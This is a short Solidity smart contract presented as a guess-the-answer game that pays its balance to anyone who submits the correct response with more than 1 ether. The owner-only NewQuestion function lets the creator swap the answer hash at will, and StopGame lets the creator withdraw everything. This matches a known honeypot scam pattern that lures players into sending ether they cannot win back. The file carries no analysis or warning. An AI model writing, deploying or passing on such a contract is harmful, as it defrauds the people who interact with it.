pragma solidity ^0.4.18;

contract Whatchamacallit
{
    bytes32 responseHash;
    address questionSender;
    string public question;
 
    function Guess(string _response) public payable {
        if (responseHash == keccak256(_response) && msg.value>1 ether) {
            msg.sender.transfer(this.balance);
        }
    }
 
    function StartGame(string _question, string response) public payable {
        if (responseHash==0x0) {
            responseHash = keccak256(response);
            question = _question;
            questionSender = msg.sender;
        }
    }

    function StopGame() public payable {
        if (msg.sender==questionSender) {
            msg.sender.transfer(this.balance);
        }
    }

    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if (msg.sender==questionSender) {
            question = _question;
            responseHash = _responseHash;
        }
    }

    function () public payable { }
}